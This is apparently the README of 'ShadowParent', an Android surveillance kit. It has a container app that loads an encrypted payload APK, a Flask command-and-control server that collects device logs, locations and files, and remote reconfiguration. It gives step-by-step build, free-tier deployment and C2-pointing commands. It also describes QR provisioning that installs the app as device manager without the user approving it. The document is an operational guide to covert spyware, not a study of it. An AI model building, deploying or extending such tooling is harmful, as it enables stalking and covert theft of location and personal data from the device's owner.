# ShadowParent

Android container app (`com.sp.core`) + dynamically-loaded payload APK (`com.sp.payload`)
+ Flask C2 dashboard with web UI.

## Layout
```
android/         Gradle project, app module (com.sp.core)
payload/         Standalone APK module (com.sp.payload)
c2/              Flask C2 server (ingest API + dashboard)
tools/           encrypt_payload.py, gen_c2_config.py
wizard/          keystore + zero-touch QR provisioning
render.yaml      Render Blueprint (free tier, no Docker)
```

## C2 server

```bash
pip install -r c2/requirements.txt
cd c2 && PORT=8000 gunicorn --chdir . --bind 0.0.0.0:$PORT --workers 1 app:app
```

- `POST /ingest` — encrypted device log (form: `d`, `k`)
- `POST /upload` — file upload (multipart: `meta`, `f` + `X-Key` header)
- `GET  /dashboard` — web UI (login required)
- `GET  /api/devices|logs|location|files` — JSON API
- `GET  /health` — liveness probe

### Environment
| Var | Default | Purpose |
|---|---|---|
| `ADMIN_USER` / `ADMIN_PASS` | admin / admin123 | dashboard login |
| `API_KEY` | *(empty = accept all)* | shared secret for ingest/upload |
| `SECRET_KEY` | random | session signing |
| `DATABASE_URL` | *(empty)* | Postgres URL; falls back to SQLite |
| `DB_PATH` | /tmp/sp.db | SQLite file |
| `UPLOAD_DIR` | /tmp/sp_uploads | uploaded files |

> Free Render instances have an ephemeral filesystem — SQLite and uploads reset
> on every redeploy. Set `DATABASE_URL` to a persistent Postgres for durability.

## Deploy to Render
1. Push this repo to GitHub (public)
2. Render → New → Web Service → pick the repo
3. Blueprint is read from `render.yaml` automatically
4. Set `ADMIN_PASS` and `API_KEY` in the Environment tab
5. Copy the resulting `https://*.onrender.com` URL

Or use `bash deploy.sh` (asks for GitHub user, repo name, PAT).

## Point the app at your C2
```bash
# bake into native constants
make config C2_URL=https://your-app.onrender.com API_KEY=sk-xt-...

# or change without rebuilding: put assets/c2.conf into the APK
#   https://your-app.onrender.com|sk-xt-...

# or remotely, via FCM: {"cmd":"cfg","url":"https://...","key":"sk-..."}
```

## Build
```bash
make keystore
make payload
make apk
make zip
```

`gradle wrapper` must be run once to produce `gradle/wrapper/gradle-wrapper.jar`.

## Zero-Touch provisioning
```bash
make qr APK_URL=https://your-server/app.apk WIFI_SSID=Net WIFI_PASS=secret
```
Generates `build/provision-qr.png` + payload JSON. Scan during OOBE to enroll
the device as managed and install the APK without manual approval.
